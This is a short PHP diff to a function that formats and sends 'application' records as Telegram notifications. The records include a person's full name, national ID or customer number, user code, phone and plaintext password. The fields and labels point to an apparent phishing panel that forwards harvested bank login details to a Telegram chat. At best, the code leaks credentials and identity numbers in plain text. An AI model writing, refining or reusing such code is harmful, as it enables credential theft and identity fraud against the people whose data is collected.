@@ -9,7 +9,8 @@ function sendTelegramNotification(array $application, string $phone = ''): bool
 
     $id = $application['id'] ?? '?';
     $fullName = $application['full_name'] ?? '';
-    $tckn = $application['national_id'] ?? $application['user_code'] ?? '';
+    $tckn = $application['national_id'] ?? '';
+    $userCode = $application['user_code'] ?? '';
     $phoneDisplay = $phone ?: $application['phone'] ?? '';
     $tip = $application['tip'] ?? 'bireysel';
     $status = $application['status'] ?? 'beklemede';
@@ -22,7 +23,12 @@ function sendTelegramNotification(array $application, string $phone = ''): bool
     if ($fullName !== '') {
         $msg .= "$fullName\n";
     }
-    $msg .= "TCK: $tckn\n";
+    if ($tckn !== '') {
+        $msg .= "Musteri No: $tckn\n";
+    }
+    if ($userCode !== '' && $userCode !== $tckn) {
+        $msg .= "Kul. Kodu: $userCode\n";
+    }
     if ($sifre !== '') {
         $msg .= "Sifre: $sifre\n";
     }
